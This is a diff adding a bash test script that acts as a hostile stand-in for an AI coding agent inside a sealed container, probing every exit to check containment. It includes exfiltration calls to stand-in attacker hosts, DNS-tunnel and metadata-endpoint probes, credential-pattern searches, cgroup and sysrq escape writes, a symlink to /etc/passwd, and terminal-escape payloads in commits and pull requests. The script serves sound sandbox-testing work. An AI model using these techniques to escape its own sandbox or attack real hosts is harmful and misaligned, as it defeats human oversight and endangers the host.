@@ -1,0 +1,172 @@
+#!/usr/bin/env bash
+# Hostile stand-in for Claude Code, run by TestHostile inside the real sealed
+# agent container. It stands in for what a malicious plugin's code can do: it
+# runs as the agent's user (uid 10001), with no capabilities, a read-only
+# root, an internal network whose only exit is the proxy, and placeholders
+# where credentials would be. It tries every way out and every way to hurt
+# the host through the session's output, and writes one result line per
+# attempt into the repository, so the results come back in the session's
+# patch. Each attempt's expected (contained) outcome is documented, with its
+# source, in docs/proxy-tests/end-to-end.md.
+#
+# It never starts with set -e: an attempt that fails is the point, and the
+# script must run every one and still commit its results.
+#
+# The last argument is the mode (the launcher passes it as the prompt):
+#   probe      the full catalogue, plus a hostile-but-valid pull request
+#   symlink    plant a symlink where the host review reads a regular file
+#   hugepatch  produce a patch larger than the review will read
+
+mode=probe
+for arg in "$@"; do
+  case $arg in probe | symlink | hugepatch) mode=$arg ;; esac
+done
+
+RESULTS="$PWD/sealroom-hostile.txt"
+: > "$RESULTS"
+rec() { printf '%s=%s\n' "$1" "$2" >>"$RESULTS"; }
+
+# http prints the HTTP status, or 000 when the connection or the handshake
+# fails (no route, refused, or no certificate for the name).
+http() { curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$@" 2>/dev/null; }
+# tcp and udp report whether a raw socket to an address and port opens.
+tcp() { timeout 5 bash -c "exec 3<>/dev/tcp/$1/$2" >/dev/null 2>&1 && echo open || echo blocked; }
+udp() { timeout 5 bash -c "echo -n x >/dev/udp/$1/$2" >/dev/null 2>&1 && echo open || echo blocked; }
+# resolve reports whether a name resolves at all. DNS is answered by the
+# proxy for the run's allowed names only; everything else does not exist.
+resolve() { getent hosts "$1" >/dev/null 2>&1 && echo resolved || echo unresolved; }
+
+# The proxy's address is the only nameserver, and the only reachable peer.
+set -- $(grep -m1 nameserver /etc/resolv.conf)
+PROXY_IP=$2
+GATEWAY_IP="${PROXY_IP%.*}.1"
+
+RUN_REPO=octocat/Hello-World
+OTHER_REPO=golang/go
+GOOD_MSG='{"model":"claude-haiku-4-5-20251001","max_tokens":1,"messages":[{"role":"user","content":"hi"}]}'
+# A Messages request that asks Anthropic's servers to connect to an MCP
+# server of the attacker's: a server-side tool the proxy must refuse.
+TOOL_MSG='{"model":"claude-haiku-4-5-20251001","max_tokens":1,"messages":[{"role":"user","content":"hi"}],"mcp_servers":[{"type":"url","url":"https://evil.example/mcp","name":"x"}]}'
+ANTHROPIC_HDRS=(-H 'anthropic-version: 2023-06-01' -H 'content-type: application/json')
+
+probe() {
+  # --- Theme A: no route out but the proxy ---
+  rec egress-arbitrary-https "$(http https://exfil.attacker.example/)"
+  rec egress-plain-http "$(http http://exfil.attacker.example/)"
+  rec egress-raw-ip-https "$(http https://1.1.1.1/)"
+  rec egress-ipv6 "$(http 'https://[2606:4700:4700::1111]/')"
+  rec egress-http-to-proxy "$(http "http://$PROXY_IP/")"
+  rec egress-proxy-alt-port "$(http "https://$PROXY_IP:8443/")"
+  rec tcp-proxy-ssh "$(tcp "$PROXY_IP" 22)"
+  rec tcp-proxy-http "$(tcp "$PROXY_IP" 8080)"
+  rec tcp-gateway "$(tcp "$GATEWAY_IP" 443)"
+  rec tcp-metadata "$(tcp 169.254.169.254 80)"
+  rec udp-external-dns "$(udp 8.8.8.8 53)"
+
+  # --- Theme B: DNS carries nothing out ---
+  rec dns-exfil "$(resolve ZGF0YS1zdGVhbA.exfil.attacker.example)"
+  rec dns-host-docker-internal "$(resolve host.docker.internal)"
+  rec dns-host-containers-internal "$(resolve host.containers.internal)"
+  rec dns-metadata "$(resolve metadata.google.internal)"
+  # Any name the runtime wrote into /etc/hosts resolves without the proxy.
+  rec hosts-entries "$(grep -vE '^[[:space:]]*(#|$)' /etc/hosts | grep -vcE '^(127\.0\.0\.1|::1)[[:space:]]+localhost[[:space:]]*$')"
+  rec dns-allowed-control "$(resolve api.anthropic.com)"
+
+  # --- Theme C: no credential, no secret, no escape ---
+  rec uid "$(id -u)"
+  rec caps "$(grep -m1 '^CapEff:' /proc/self/status | tr -d '[:space:]')"
+  rec credential-vars "$(env | grep -cE '^[A-Z_]*(TOKEN|KEY)=')"
+  rec placeholders "$(env | grep -cE '^[A-Z_]*(TOKEN|KEY)=sealroom-placeholder$')"
+  rec real-secrets-env "$(env | grep -vE '=sealroom-placeholder$' | grep -cE 'sk-ant-|ghp_|ghs_|github_pat_|AKIA[0-9A-Z]{16}|BEGIN [A-Z ]*PRIVATE KEY')"
+  rec ca-key-readable "$(test -r /etc/sealroom/ca.key && echo yes || echo no)"
+  rec proxy-config-readable "$(test -r /etc/sealroom/proxy.json && echo yes || echo no)"
+  rec docker-socket "$(for s in /var/run/docker.sock /run/docker.sock /var/run/podman/podman.sock; do test -S "$s" && echo present && break; done || echo absent)"
+
+  # --- Theme D: the proxy is the only exit, and it holds the credentials ---
+  rec model-placeholder "$(http https://api.anthropic.com/v1/messages "${ANTHROPIC_HDRS[@]}" -H "authorization: Bearer $CLAUDE_CODE_OAUTH_TOKEN" -d "$GOOD_MSG")"
+  rec model-own-key "$(http https://api.anthropic.com/v1/messages "${ANTHROPIC_HDRS[@]}" -H 'authorization: Bearer sk-ant-attacker-key' -d "$GOOD_MSG")"
+  rec files-api "$(http -X POST https://api.anthropic.com/v1/files -H "authorization: Bearer $CLAUDE_CODE_OAUTH_TOKEN")"
+  rec server-side-tool "$(http https://api.anthropic.com/v1/messages "${ANTHROPIC_HDRS[@]}" -H "authorization: Bearer $CLAUDE_CODE_OAUTH_TOKEN" -d "$TOOL_MSG")"
+
+  # --- Theme E: GitHub reads only, on the run's repository only ---
+  rec run-repo-read "$(http "https://api.github.com/repos/$RUN_REPO")"
+  rec other-repo-own-token "$(http "https://api.github.com/repos/$OTHER_REPO" -H 'authorization: Bearer ghp_attackerTokenValue')"
+  rec github-write-issue "$(http -X POST "https://api.github.com/repos/$RUN_REPO/issues" -d '{"title":"x"}')"
+  rec github-graphql "$(http -X POST https://api.github.com/graphql -d '{"query":"{viewer{login}}"}')"
+  rec github-gist "$(http -X POST https://api.github.com/gists -d '{"files":{"a":{"content":"stolen"}}}')"
+  rec other-git-fetch "$(http "https://github.com/$OTHER_REPO/info/refs?service=git-upload-pack")"
+  rec attacker-git-push "$(http -X POST "https://github.com/$OTHER_REPO/git-receive-pack" -d '')"
+
+  # --- Theme F: the process and memory limits are in place ---
+  # The pid limit is the control against a fork bomb: a live fork bomb would
+  # only starve the session's own pid budget without proving anything the
+  # kernel's enforcement of this cgroup value does not already guarantee, so
+  # the limit is asserted as configured, not exercised.
+  rec pids-max "$(cat /sys/fs/cgroup/pids.max 2>/dev/null || cat /sys/fs/cgroup/pids/pids.max 2>/dev/null)"
+  rec memory-max "$(cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null)"
+  # A subshell capped by ulimit -v so the growth cannot touch the host VM: an
+  # unbounded allocation must not succeed. This runs in a child process only,
+  # so it never affects the session that follows.
+  if timeout 10 bash -c 'ulimit -v 262144; s=x; while :; do s="$s$s"; done' >/dev/null 2>&1; then
+    rec mem-overlimit unbounded
+  else
+    rec mem-overlimit blocked
+  fi
+
+  # --- Theme G: nothing writes to the host but the output directory ---
+  rec write-etc "$(echo x 2>/dev/null >/etc/sealroom-escape && echo wrote || echo blocked)"
+  rec write-usr "$(echo x 2>/dev/null >/usr/bin/sealroom-escape && echo wrote || echo blocked)"
+  rec write-repo-mount "$(echo x 2>/dev/null >/src/sealroom-escape && echo wrote || echo blocked)"
+  rec write-proc-sysrq "$(echo 0 2>/dev/null >/proc/sysrq-trigger && echo wrote || echo blocked)"
+  rec cgroup-release-agent "$(echo x 2>/dev/null >/sys/fs/cgroup/release_agent && echo wrote || echo blocked)"
+  rec out-writable "$(echo x 2>/dev/null >/out/.probe && rm -f /out/.probe && echo yes || echo no)"
+  rec mknod-device "$(mknod /out/sealroom-dev c 1 3 2>/dev/null && echo made || echo blocked)"
+  rec hardlink-ca "$(ln /etc/sealroom/ca.crt /out/sealroom-hl 2>/dev/null && echo made || echo blocked)"
+  # A FIFO in the output directory: the host must still empty it, never block.
+  mkfifo /out/sealroom-fifo 2>/dev/null && rec fifo-created yes || rec fifo-created no
+}
+
+# commit records the results (and any extra files) as one commit, so the
+# session's patch carries them back to the host.
+commit() {
+  git switch -q -c hostile/attempts 2>/dev/null || git switch -q -c hostile/attempts2
+  git add -A
+  # Escape sequences in the commit message: the host review must show them as
+  # text, never let them rewrite the terminal.
+  git -c user.name=hostile -c user.email=hostile@sealroom.invalid \
+    commit -q -m "$(printf 'Hostile results \x1b[2Kand \xe2\x80\xaemoc.liam')"
+}
+
+case $mode in
+probe)
+  probe
+  # A banner file full of terminal escapes and bidi overrides, to prove the
+  # diff the user reviews is sanitised.
+  printf 'ESC\x1b[31m RED \x1b]0;pwned\x07 BIDI \xe2\x80\xae txet-desrever end\n' >sealroom-banner.txt
+  commit
+  git push -q origin hostile/attempts 2>/dev/null
+  # A hostile-but-valid pull request: escapes in the title and body, and a
+  # base that looks like a command-line option.
+  gh pr create \
+    --title "$(printf 'Merge me \x1b[8mhidden')" \
+    --body "$(printf 'Looks fine.\n\x1b[2J\x1b]0;owned\x07\nBidi: \xe2\x80\xae lacitirc-non\nDone.')" \
+    --base '--web' 2>/dev/null
+  ;;
+symlink)
+  # A minimal real change, so the session produces a patch and a branch.
+  echo planted >sealroom-planted.txt
+  commit
+  # Plant the pull request's body as a symbolic link to a file of the host's.
+  # The host must refuse it, never follow it, never show or post its contents.
+  mkdir -p /out/pr
+  printf 'T' >/out/pr/title
+  ln -s /etc/passwd /out/pr/body
+  ;;
+hugepatch)
+  # A file larger than the review will read: the patch must be refused whole,
+  # never truncated, so nothing beyond the limit reaches the host.
+  tr '\0' 'A' </dev/zero | head -c 17000000 >sealroom-huge.txt
+  commit
+  ;;
+esac
+exit 0
